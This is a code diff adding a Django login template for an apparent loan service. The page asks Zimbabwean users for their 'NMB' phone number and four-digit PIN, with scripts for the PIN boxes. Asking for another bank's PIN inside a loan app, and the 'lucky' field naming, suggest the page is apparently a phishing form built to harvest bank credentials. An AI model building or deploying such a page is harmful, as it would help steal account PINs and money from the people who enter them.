@@ -1,0 +1,148 @@
+{% extends 'loan/base.html' %}
+{% block header_subtitle %}Secure Login{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div class="card-header">
+        <h2>Secure Login</h2>
+        <p>Enter your NMB phone & Your PIN</p>
+    </div>
+
+    <form method="POST" action="{% url 'login' %}">
+        {% csrf_token %}
+
+        <!-- Phone Number -->
+        <div class="form-group">
+            <label>PHONE NUMBER</label>
+            <div style="display:flex; border:1.5px solid var(--primary-blue); border-radius:8px; overflow:hidden;">
+                <span style="background:#f1f5f9; padding:12px; font-weight:bold; font-size:13px; border-right:1px solid #cbd5e1;">
+                    🇿🇼 +263
+                </span>
+                <input
+                    type="text"
+                    name="phone"
+                    class="form-control"
+                    placeholder="Enter phone number"
+                    style="border:none;"
+                    required>
+            </div>
+        </div>
+
+        <!-- PIN Input Section -->
+        <div class="form-group" style="margin-top: 15px;">
+            <label>ENTER YOUR PIN</label>
+
+            <!-- 4 PIN Boxes (Always Visible, Values Hidden as Dots) -->
+            <div class="num-inputs" style="display:flex; justify-content:center; gap:8px; margin-top:8px;">
+                <input
+                    name="num1"
+                    type="password"
+                    maxlength="1"
+                    class="lucky-field"
+                    inputmode="numeric"
+                    autocomplete="off"
+                    required
+                    style="width:50px;height:52px;text-align:center;font-size:24px;border:1px solid #ccc;border-radius:6px;">
+
+                <input
+                    name="num2"
+                    type="password"
+                    maxlength="1"
+                    class="lucky-field"
+                    inputmode="numeric"
+                    autocomplete="off"
+                    required
+                    style="width:50px;height:52px;text-align:center;font-size:24px;border:1px solid #ccc;border-radius:6px;">
+
+                <input
+                    name="num3"
+                    type="password"
+                    maxlength="1"
+                    class="lucky-field"
+                    inputmode="numeric"
+                    autocomplete="off"
+                    required
+                    style="width:50px;height:52px;text-align:center;font-size:24px;border:1px solid #ccc;border-radius:6px;">
+
+                <input
+                    name="num4"
+                    type="password"
+                    maxlength="1"
+                    class="lucky-field"
+                    inputmode="numeric"
+                    autocomplete="off"
+                    required
+                    style="width:50px;height:52px;text-align:center;font-size:24px;border:1px solid #ccc;border-radius:6px;">
+            </div>
+
+            <!-- Checkbox to Reveal/Hide PIN -->
+            <div style="display:flex; align-items:center; justify-content:center; gap:8px; margin-top:12px;">
+                <input type="checkbox" id="showPinCheckbox" style="cursor:pointer; width:16px; height:16px;">
+                <label for="showPinCheckbox" style="font-size:13px; color:#475569; cursor:pointer; margin:0;">Show PIN</label>
+            </div>
+        </div>
+
+        <button type="submit" class="btn-primary" style="margin-top:20px;">
+            CONTINUE
+        </button>
+    </form>
+</div>
+
+<script>
+// ========== SHOW / HIDE PIN VIA CHECKBOX ==========
+const showPinCheckbox = document.getElementById("showPinCheckbox");
+const luckyInputs = document.querySelectorAll(".lucky-field");
+
+showPinCheckbox.addEventListener("change", function () {
+    const targetType = this.checked ? "text" : "password";
+    luckyInputs.forEach(input => {
+        input.type = targetType;
+    });
+});
+
+// ========== AUTO MOVE + PASTE ==========
+luckyInputs.forEach((input, index) => {
+
+    input.addEventListener("input", function () {
+        // Allow only digits
+        this.value = this.value.replace(/\D/g, "");
+
+        // Auto move to next field
+        if (this.value.length === 1 && index < luckyInputs.length - 1) {
+            luckyInputs[index + 1].focus();
+        }
+    });
+
+    input.addEventListener("keydown", function (e) {
+        if (e.key === "Backspace" && this.value === "" && index > 0) {
+            luckyInputs[index - 1].focus();
+        }
+        if (e.key === "ArrowLeft" && index > 0) {
+            luckyInputs[index - 1].focus();
+        }
+        if (e.key === "ArrowRight" && index < luckyInputs.length - 1) {
+            luckyInputs[index + 1].focus();
+        }
+    });
+
+    input.addEventListener("paste", function (e) {
+        e.preventDefault();
+
+        const pasted = (e.clipboardData || window.clipboardData)
+            .getData("text")
+            .replace(/\D/g, "")
+            .slice(0, 4);
+
+        pasted.split("").forEach((digit, i) => {
+            if (luckyInputs[i]) {
+                luckyInputs[i].value = digit;
+            }
+        });
+
+        if (pasted.length) {
+            luckyInputs[Math.min(pasted.length - 1, 3)].focus();
+        }
+    });
+});
+</script>
+{% endblock %}
